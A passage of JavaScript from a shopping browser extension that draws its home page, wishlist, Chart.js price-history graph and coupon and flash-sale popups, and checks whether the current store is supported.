      res.map((e)=>{
        arr.push(e);
      })
      
    }
    render_wishList(arr, 2);
    return true;
  }

  let myDataArr = await add_loc_wl_to_data(result);
  console.log("updated wl data after adding...",myDataArr);

  render_wishList(myDataArr, 2);  

}

// wishing according to time in home-page...
function wish_me() {
  wish_str = '';
  let hrs = new Date().getHours();

  if (hrs < 12) {
    wish_str = 'Good Morning';
  } else if (hrs < 17) {
    wish_str = 'Good Afternoon';
  } else {
    wish_str = 'Good Evening';
  }
}

// rendering home-page..
function ren_home_page() {
  if(!fs_init) return;
  check_side_pop_dis();
  wish_me();

  // ************ rendering loader ***********

  mainExtSub.innerHTML = `${ext_main_temp_struc(
    '',
    '',
    '',
    main_ext_id,
    is_flash,
    true,
    1
  )}`;
  if (mainExtSub.querySelector('.contentBlock'))
    mainExtSub.querySelector('.contentBlock').innerHTML = `${loader()}`;

  // ************ rendering loader ***********

  // ************* calling data *************
  (async function calling_data() {
    try {
      let rend_str_obj = {
        fetch_ruc: { prop: rec_used_coup_crd, str: '' },
        fetch_rpd: { prop: rec_prc_drp_crd, str: '' },
        fetch_deals: { prop: deals_hp_crd, str: '' },
        fetch_sfu: { prop: sale_for_you_crd, str: '' },
      };

      // let result = await sendMessagePromise({
      //   dataMSg: { msg: 'fetch_ruc', data: '' },
      // });
      // console.log('getting back ruc data', result);
      // loc_data_obj['fetch_ruc'] = result;
      // console.log('fehbeihvbeivhb.........loc in ren home', loc_data_obj);

      rend_str_obj['fetch_ruc'].str = str_maker(loc_data_obj['fetch_ruc'], 'ruc');

      let arr = ['fetch_rpd', 'fetch_sfu', 'fetch_deals'];
      let nm = ['rpd', 'sfu', 'deals'];
      for (let i = 0; i < arr.length; i++) {
        rend_str_obj[arr[i]].str = str_maker(loc_data_obj[arr[i]], nm[i]);
      }
      // 'fetch_rpd','fetch_sfu','fetch_deals'
      console.log("all stores main data...",loc_data_obj['fetch_all_stores']);
      let all_str = str_maker(loc_data_obj['fetch_all_stores'], 'all_str');
      let ban_car =
        loc_data_obj['fetch_advert'] &&
        str_maker(loc_data_obj['fetch_advert'], 'banner');

      mainExtSub.querySelector('.contentBlock').innerHTML = `${home_page_temp(
        main_ext_id,
        rend_str_obj,
        wish_str,
        is_flash,
        all_str,
        ban_car
      )}`;

      if(loc_data_obj['fetch_advert']){

        if(bnnr_carsl_clr_int_glb_var)clearInterval(bnnr_carsl_clr_int_glb_var);
        bnnr_carsl_clr_int_glb_var = setInterval(autoplayCarousel, 4000);
      }
      // ********************** CALLING ALL STORES
    } catch (error) {
      console.log('this is arr calling err:', error);
    }
  })();

  // ************* calling data *************
  mainExtSub.querySelector('.nav_main_cont').innerHTML = `${navbar(
    main_ext_id,
    is_flash,
    1
  )}`;
}

//  checking page to render on side-popup click...
async function check_ext_pg_to_rend() {
  // manual_coupons_side_pp();
  // return;
  
  let cp = handle_clickrendvar('get', 'curr_pg');
  if(!cp) {
    open_on_load =1;
    return console.log('page not ready');
  }
  console.log('current page on click handler...', cp);
  main_ext_no_scroll();
  if (cp == 'not_supp' || cp == 'blk_lst') {
    if (cp == 'not_supp') make_add_str_pop(true);

    // fetching data for home page...
    ren_home_page();
    grabbable.querySelector('.contentBlock').innerHTML = `${univ_loader('100%','553px')}`;
    await bd();
    ren_home_page();
    // fetching data for home page...

  } else if (cp == 'avl_str') {
    bd();
    (async function callME() {
      // <--- code to check cart-page -->

      let resp = isCartPage();
      console.log('is cart page response...', resp);
      if (resp) {
        return rend_aac_popup(resp);
      }
      // else ren_ind_store_by_url();
      // return true;
      // if(resp){
      //     console.log("we are in the cart page...",resp);
      //     if(resp.is_cpns){
      //         glb_cpn_arr = resp.is_cpns.c;
      //         rend_aac_popup(resp.is_cpns.c);
      //     }else{
      //         ren_ind_store_by_url();
      //     }

      //     return true;
      // }

      // <--- code to check cart-page -->

      // <--- code to check product-page -->

      is_PID = await init_graph();
      console.log('product page variable data1', is_PID);

      if (is_PID.pid_this) {
        let my_gd = [];
        sel_resp_prc_grph = add_wl_popup();
        console.log(
          'product page graph-data variable:',
          my_gd,
          sel_resp_prc_grph
        );
        glb_str_det_var = {
          grp_data: my_gd,
          prd_sel_data: sel_resp_prc_grph,
          pid: is_PID.pid_this,
        };
        ren_prc_alrt_pg(glb_str_det_var, '7d');
        return true;
      }

      // <--- code to check product-page -->

      let result = await sendMessagePromise({
        dataMSg: { msg: 'fetch_whish_list', data: '' },
      });
      await call_render_wish_list(result);
    })();
  }
}

// changing clickRendVar accordingly....
export function handle_clickrendvar(op, key, value) {
  if (op == 'get') {
    return clickRendVar[`${key}`];
  } else if (op == 'set') {
    clickRendVar[`${key}`] = value;
    if(open_on_load) check_ext_pg_to_rend();
    return clickRendVar[`${key}`];
  }
}

// rendering add-store_popup...
export function make_add_str_pop(isDis = false) {
  if(!fs_init) return;
  if(document.cookie.indexOf('add_store_model_shown=')> -1) return true;

  // if (rend_side_pop) return;
  if (document.querySelector('.add_store_cont_main'))
    document.querySelector('.add_store_cont_main').remove();
  let mySidePopup = document.createElement('div');
  mySidePopup.setAttribute('class', 'add_store_cont_main');
  mySidePopup.style.display = isDis ? 'block' : 'none';
  mySidePopup.style.width = '100vw';
  mySidePopup.style.height = '0';
  mySidePopup.innerHTML = `${add_store_popup()}`;
  ext_popup.appendChild(mySidePopup);
  // rend_side_pop = 1;
}

// loading login-popup in wish-list...
function load_login_popup_wl() {
  if(!fs_init) return;
  if (mainExtSub.querySelector('.apd_login_mdl_main')) return;
  let apd_log_mdl = document.createElement('div');
  apd_log_mdl.classList.add('apd_login_mdl_main');
  apd_log_mdl.style.cssText =
    'position: absolute;top: 48px;width: 350px;height: 550px;background-color: rgb(115 117 119 / 70%);display: flex;justify-content: center;align-items: center;z-index:99999';
  apd_log_mdl.innerHTML = `${login_to_add_prc_drp}`;
  mainExtSub.appendChild(apd_log_mdl);
}

// checking web-page for meta-data...
async function check_webpage_metadata() {
  return new Promise((res, rej) => {
    chrome.runtime.sendMessage(
      { dataMSg: { msg: 'fetch_avail_stores', data: window.location.href } },
      (resp) => {
        let not_sup_str = 'fetch_avail_stores_store_not_avail',
          blk_list_str = 'temp_str_blk_list',
          avail_store_str = 'fetch_avail_stores';

        console.log('resp check web-page..', resp.storeData);
        if (
          resp &&
          (resp.storeData.msg == not_sup_str || resp.storeData.msg == blk_list_str)
        ) {
          res({ resp: 'store not in the list', metadata: '' });
        }
        if (resp && resp.storeData.msg == avail_store_str)
          res({ resp: 'store avail in list', metadata: resp.storeData.data });
      }
    );
  });
}

// appending price-graph popup....
function make_price_graph_pop(isDis = false) {
  if(!fs_init) return;

  console.log('sel_resp_prc_grph data...', sel_resp_prc_grph);

  // <-- getting table data -->

  let table_obj = {
    curr_prc: { p: '', d: '' },
    max_prc: { p: '', d: '' },
    min_prc: { p: '', d: '' },
    avg_prc: '',
  };
  let arr = glb_str_det_var.grp_data;

  // <-- checking arr -->

  let ck = Array.isArray(arr);
  if (!ck) arr = arr.data;

  // <-- checking arr -->

  console.log('make popup arr...', arr);
  table_obj.curr_prc.d = arr[arr.length - 1][0];
  table_obj.curr_prc.p = arr[arr.length - 1][1];

  let min_obj = {
      p: Number(arr[0][1]),
      d: arr[0][0],
    },
    max_obj = {
      p: Number(arr[0][2]),
      d: arr[0][0],
    };
  arr.forEach((e) => {
    if (Number(e[1]) <= min_obj.p) {
      min_obj.p = Number(e[1]);
      min_obj.d = e[0];
    }

    if (Number(e[2]) >= max_obj.p) {
      max_obj.p = Number(e[2]);
      max_obj.d = e[0];
    }
  });

  table_obj.max_prc = max_obj;
  table_obj.min_prc = min_obj;
  let sum = arr.reduce(
    (total, p) => total + parseInt(p[1]) + parseInt(p[2]),
    0
  );
  console.log(sum);
  table_obj.avg_prc = Math.round(sum / 2 / arr.length);
  console.log('glb str det var...', arr, 'table object', table_obj);

  // <-- getting table data -->

  if (grabbable.querySelector('.price_graph_cont_main'))
    grabbable.querySelector('.price_graph_cont_main').remove();
  let mySidePopup = document.createElement('div');
  mySidePopup.setAttribute('class', 'price_graph_cont_main');
  mySidePopup.style.display = isDis ? 'block' : 'none';
  mySidePopup.innerHTML = `${pg_popup_temp(glb_str_det_var, table_obj)}`; // price_graph_popup temp...
  ext_popup.appendChild(mySidePopup);

  if (ext_popup.querySelector('#fs_container')) {
    prc_graph_and_data_handler(
      {
        canva_sel: '#fs_container',
        h: '100%',
        w: '100%',
      },
      '45d',
      glb_str_det_var
    );
  }
}

// appending graph and processing data...
async function prc_graph_and_data_handler(
  grph_sel_obj = {},
  days_str = '',
  params
) {
  if(!fs_init) return;

  let d_temp = {
    prd_wl: '',
    dis_data: params.prd_sel_data,
  };

  ext_popup.querySelector(grph_sel_obj.canva_sel).innerHTML = `${univ_loader(
    grph_sel_obj.h,
    grph_sel_obj.w
  )}`;

  params.grp_data = await get_graph_data(is_PID.g_code, is_PID.pid_this);
  console.log('response from get_graph_data function', params.grp_data);

  if (params.grp_data && params.grp_data.value) {
    params.grp_data = JSON.parse(params.grp_data.value);
    if (d_temp.dis_data && d_temp.dis_data.starting_price) {
      console.log('params.grp_data.value', params.grp_data);

      // <-- appending todays data -->

      let today_prc = d_temp.dis_data.starting_price;

      let t_d = new Date(),
        yyyy = t_d.getFullYear().toString(),
        mm = (t_d.getMonth() + 1).toString(),
        dd = t_d.getDate().toString(),
        d_str = yyyy + '-' + mm + '-' + dd,
        prc_arr = [];

      prc_arr.push(d_str, `${today_prc}`, `${today_prc}`);

      params.grp_data.push(prc_arr);
      console.log('todays arr...', params.grp_data);

      // <-- appending todays data -->
    }
  }
  ext_popup.querySelector(grph_sel_obj.canva_sel).innerHTML = '';

  let data = [];
  if (params.grp_data) {
    data = graph_manipulator(params.grp_data, days_str);
  }
  const labels = data.map((y) => y[0]);

  // ****************** data options ************************

  let dataOpt = {
      labels: labels,
      datasets: [
        {
          steppedLine: true,
          label: 'Max Price',
          data: data.map((d) => d[1]),
          borderWidth: 1,
          pointRadius: 1,
          backgroundColor: '#ffe0b2',
          backgroundColor: '#0c579659',
          borderColor: '#0c5796', // "rgb(96, 125, 139)",
          fill: 1,
          stepped: 'middle',
        },
        {
          label: 'Min Price',
          stepped: 'middle',
          data: data.map((data) => data[2]),
          borderWidth: 1,
          pointRadius: 1,
          backgroundColor: 'transparent',
          // backgroundColor: "#0c579659",
          // borderColor:'#fb8c00'// 'blue'
          borderColor: '#0c5796',
          fill: false,
        },
      ],
    },
    dispOpt = {
      responsive: true,
      plugins: {
        legend: {
          position: 'top',
        },
        tooltip: {
          mode: 'index',
          intersect: false,
          titleSpacing: 80,
          titleMarginBottom: 10,
          xPadding: 10,
          yPadding: 10,
          bodyFontFamily: 'rubik, sans-serif',
          bodySpacing: 7,
          backgroundColor: '#0c5796',
          bodyFontColor: 'white',
          titleFontColor: 'white',
        },
      },

      scales: {
        x: {
          type: 'time',
          time: {
            minUnit: 'day',
            tooltipFormat: 'DD-MMM-YY',
          },
          ticks: {
            maxTicksLimit: 14,
            maxRotation: 0,
          },
        },
        y: {
          ticks: {
            // Include a dollar sign in the ticks
            callback: function (value, index, values) {
              return 'Rs.' + value;
            },
            stepSize: 1,
            maxTicksLimit: 8,
          },
        },
      },
    };

  let myCanvas = ext_popup.querySelector(grph_sel_obj.canva_sel);
  new Chart(myCanvas, {
    type: 'line',
    data: dataOpt,
    options: dispOpt,
    tooltips: {
      mode: 'index',
      intersect: false,
      titleSpacing: 80,
      titleMarginBottom: 10,
      xPadding: 10,
      yPadding: 10,
      bodyFontFamily: 'rubik, sans-serif',
      bodySpacing: 7,
      backgroundColor: '#0c5796',
      bodyFontColor: 'white',
      titleFontColor: 'white  ',
    },
  });
}

// pushing current price to price-graph array...
function prc_grph_arr_handlr(arr = [], prd_obj = {}) {
  let is_arr = Array.isArray(arr);
  if (is_arr) arr = [];

  let today_prc = prd_obj.starting_price;

  let t_d = new Date(),
    yyyy = t_d.getFullYear().toString(),
    mm = (t_d.getMonth() + 1).toString(),
    dd = t_d.getDate().toString(),
    d_str = yyyy + '-' + mm + '-' + dd,
    prc_arr = [];

  prc_arr.push(d_str, `${today_prc}`, `${today_prc}`);

  arr.push(prc_arr);
  console.log('todays arr...', arr);

  return arr;
}

// setting no background-scroll...
export function main_ext_no_scroll(scrollable = 0) {
  if(!fs_init) return;
  if (grabbable.querySelector('.ext_main_bckgrnd_1')) return 'already exists';

  let bck_bx = document.createElement('div');
  bck_bx.setAttribute('class', 'ext_main_bckgrnd_1');
  bck_bx.addEventListener('click', myFunc11);
  bck_bx.innerHTML = bckgrnd_main;
  console.log('appending bckground scroll cont....');
  grabbable.appendChild(bck_bx);

  if (!scrollable) toggle_scrollable();
}

// apply_togggle_function...
function myFunc11() {
  if(!fs_init) return;

  let e = mainExtSub.querySelector('.sub_conatiner_close_img'),
    p = ext_popup.querySelector('.fs_cls_img_aac');

  if (e) e.click();
  if (p) p.click();
}

function toggle_scrollable(e = true) {
  if (e) {
    document.body.style.height = '100vh';
    document.body.style.overflow = 'hidden';
  } else {
    if(!fs_init) return;
    let elem = grabbable.querySelector('.ext_main_bckgrnd_1');
    console.log('removing child scope111...', elem);
    if (elem) {
      elem.removeEventListener('click', myFunc11);
      grabbable.removeChild(elem);
      console.log('removing child scope...');
    }
    document.body.style.overflow = 'auto';
  }
}

export function rend_aac_popup(coupons) {
  if(!fs_init) return;

  let s = ext_popup.querySelector('.side_popup_cont'),
    cpn_cont = ext_popup.querySelector('.aac_popup_mn');

  if (cpn_cont) ext_popup.removeChild(cpn_cont);
  if (s) s.style.display = 'none';
  let elem = document.createElement('div');
  elem.setAttribute('class', 'aac_popup_mn');
  elem.innerHTML = `${aac_popup_temp(coupons.length)}`;

  ext_popup.appendChild(elem);
}

export function rend_flash_sale_reg_side_popup(data, remove = 0) {
  if(!fs_init) return;

  let f_sale_pp = ext_popup.querySelector('.flash_sale_reg_side_popup');
  if (remove) {
    if (f_sale_pp) return f_sale_pp.remove();
    return true;
  }
  if (!f_sale_pp) {
    let elem = document.createElement('div');
    elem.setAttribute('class', 'flash_sale_reg_side_popup close_class_fs');
    elem.innerHTML = `${flash_sale_reg_side_popup(data)}`;
    ext_popup.appendChild(elem);
  }
}

export function rend_succs_aac_popup(data) {
  if(!fs_init) return;

  let f_sale_pp = ext_popup.querySelector('.flash_sale_reg_side_popup');

  if (f_sale_pp) return f_sale_pp.remove();
  let elem = document.createElement('div');
  elem.setAttribute('class', 'flash_sale_reg_side_popup close_class_fs'); // close_class_fs
  elem.setAttribute('style', wrapper_style);
  elem.innerHTML = `${succs_aac_popup(data)}`;
  ext_popup.appendChild(elem);

  // if(remove){
  //     return true;
  // }
  // if(!f_sale_pp) {
  // }
}

export function rend_manual_cpns_temp_pp(data) {
  if(!fs_init) return;

  let pp = ext_popup.querySelector('.manual_cpns_pop_tble');
  if (pp) return pp.remove();
  // if(pp) {
  let elem = document.createElement('div');
  elem.setAttribute(
    'class',
    'manual_cpns_pop_tble close_class_fs close_class_fs'
  );
  elem.setAttribute('style', wrapper_style);
  elem.innerHTML = `${manual_cpns_temp_pp(data)}`;
  ext_popup.appendChild(elem);
  // }
  // if(remove){
  //     return true;
  // }
}

export function rend_no_working_counpon(data) {
  if(!fs_init) return;

  let pp = ext_popup.querySelector('.no_working_counpon_popup');
  if (pp) return pp.remove();
  let elem = document.createElement('div');
  elem.setAttribute('class', 'no_working_counpon_popup close_class_fs');
  elem.setAttribute('style', wrapper_style);
  elem.innerHTML = `${no_working_cpn_temp(data)}`;
  ext_popup.appendChild(elem);
  // if(!f_sale_pp) {
  // }
  // if(remove){
  //     return true;
  // }
}

export function rend_applying_final_counpon(remove = 0) {
  if(!fs_init) return;

  let f_sale_pp = ext_popup.querySelector('.final_cpn_pp');
  if (remove) {
    if (f_sale_pp) return f_sale_pp.remove();
    return true;
  }
  if (!f_sale_pp) {
    let elem = document.createElement('div');
    elem.setAttribute('class', 'final_cpn_pp close_class_fs');
    elem.setAttribute('style', wrapper_style);
    elem.innerHTML = `${applyng_final_cpn_pp_temp()}`;
    ext_popup.appendChild(elem);
  }
}
export function rend_coupons_not_found_pp() {
  if(!fs_init) return;

  let f_sale_pp = ext_popup.querySelector('.coupons_not_found_pp');

  let s = ext_popup.querySelector('.side_popup_cont');
  if (s) s.style.display = 'none';

  if (!f_sale_pp) {
    let elem = document.createElement('div');
    elem.setAttribute('class', 'coupons_not_found_pp');

    elem.setAttribute('style');
    elem.innerHTML = `${no_cpn_found_pp_temp()}`;
    ext_popup.appendChild(elem);
  }
}
export function rend_flash_sale_side_popup(
  data = 'Something went wrong, please refresh your window',
  remove = 0
) {
  if(!fs_init) return;

  let f_sale_pp = ext_popup.querySelector('.flash_sale_side_popup');
  if (remove) {
    if (f_sale_pp) return f_sale_pp.remove();
    return true;
  }
  if (!f_sale_pp) {
    let elem = document.createElement('div');
    elem.setAttribute('class', 'flash_sale_side_popup');
    elem.innerHTML = `${flash_sale_side_popup(data)}`;
    ext_popup.appendChild(elem);
    f_sale_pp = ext_popup.querySelector('.flash_sale_side_popup');
  }
  f_sale_pp.querySelector('#flsh_sale_msg').innerHTML = data;
}

export function close_acc_popup(button_dis = 0) {
  if(!fs_init) return;

  let s = ext_popup.querySelector('.side_popup_cont'),
    cpn_cont = ext_popup.querySelector('.aac_popup_mn'),
    bg = grabbable.querySelector('.ext_main_bckgrnd_1');
  if (bg) grabbable.removeChild(bg);
  if (cpn_cont) ext_popup.removeChild(cpn_cont);
  if (s && button_dis) s.style.display = 'block';

  document.body.style.overflow = 'auto';
}


export function rend_cpn_procssng_popup(cpn) {
  if(!fs_init) return;

  let s = ext_popup.querySelector('.aac_prcssng_mn'),
    sp = ext_popup.querySelector('.side_popup_cont');

  if (sp) sp.style.display = 'none';
  if (s) ext_popup.removeChild(s);
  let elem = document.createElement('div');
  elem.setAttribute('class', 'aac_prcssng_mn close_class_fs');
  elem.setAttribute('style', wrapper_style);

  // <-- creating coupons pallet -->

  let str = procssng_aac_cpns_button('Flipshope', -1);
  cpn.forEach((elem, index) => {
    str += procssng_aac_cpns_button(elem, index);
  });
  // str += procssng_aac_cpns_button('Flipshope',cpn.length);
  let cpn_pllt_str = `
    <div class="aac_procssng_cpn_pllt_cont">
        ${str}
    </div>
    <style>
    .aac_procssng_cpn_pllt_cont{
        background:white;
        position: absolute;
        top: 0px;
        display: flex;
        flex-direction: column;
        transition: top 2s;
    }
    </style>
    `;

  // <-- creating coupons pallet -->

  elem.innerHTML = `${cpn_processing_temp(cpn_pllt_str)}`;

  ext_popup.appendChild(elem);
}

export function aac_procssng_pp_animtn(key) {
  if(!fs_init) return;

  let currnt_pllt_child = ext_popup.querySelector(
    `[aac_cpn_blck_sss_key="${key}"]`
  );
  let s = ext_popup.querySelector('.aac_prcssng_mn'),
    my_elem = s.querySelector('.aac_procssng_cpn_pllt_cont');
  ext_popup
    .querySelector(`[aac_cpn_blck_sss_key="${key - 1}"]`)
    .setAttribute('class', 'aac_procssng_cpn_blck');
  currnt_pllt_child.setAttribute('class', 'aac_procssng_cpn_blck crrnt_cpn');
  my_elem.style.top = `${-57 - key * 82}px`;
  console.log('this animation code running...my elem:,,,', my_elem);
}

export function close_extpop(currentElem, ele = '',frc) {
  if(!fs_init) return;
  let p;
  if (ele) {
    p = ext_popup.querySelector(ele);
  } else if (currentElem) {
    let cs = currentElem.getAttribute('cont_elem');
    p = grabbable.querySelector('.' + cs).parentElement;
    let cc = p.getAttribute('class').includes('close_class_fs');
    if (!cc) return;
  }
  let bg = document.querySelector('.ext_main_bckgrnd_1'),
    ss = ext_popup.querySelector('.side_popup_cont');

  if (bg) {
    document.body.removeChild(bg);
    document.body.style.overflow = 'auto';
  }

  if (p) ext_popup.removeChild(p);

  if (ss&&!frc) ss.style.display = 'block';
}

// creating new fls-sale subs block on select....
function appending_new_fls_sl_subs_blck(data) {
  if(!fs_init) return;

  let subs_blck_str = flsh_sale_subs_crd(main_ext_id, data);
}


// background click handler...
function background_click_handlr(callBack){

if (grabbable.querySelector('.ext_main_bckgrnd_1')) return console.log('already exists');

  let bck_bx = document.createElement('div');
  bck_bx.setAttribute('class', 'ext_main_bckgrnd_1');
  bck_bx.addEventListener('click', callBack);
  bck_bx.innerHTML = bckgrnd_main;
  console.log('appending bckground scroll cont....');
  grabbable.appendChild(bck_bx);

}

function check_login_bck_to(bt){
  if(bt == 'entr_mob_scrn'){
    (function callMe() {
      let bt_btn = ext_popup.querySelector('.logn_bck_btn');
      bt_btn.setAttribute('back_to','prm_login_scrn');
      ext_popup.querySelector(
        '.logn_pg_othr_temp_cont'
      ).innerHTML = `${logn_pg_otp_tmp()}`;
    })();
  }else if(bt == 'prm_login_scrn'){
    ext_popup.innerHTML = `${login_pg_tmp(main_ext_id)}`;
    rend_side_pop = 0;
    document.body.style.overflow = 'hidden';
  }
}

function autoplayCarousel() {
  if (counter_carsl_glb_var >= total_carsl_glb_var) counter_carsl_glb_var = 0;
  // console.log(counter_carsl_glb_var);
  grabbable.getElementById('slide' + counter_carsl_glb_var++).checked = true;
}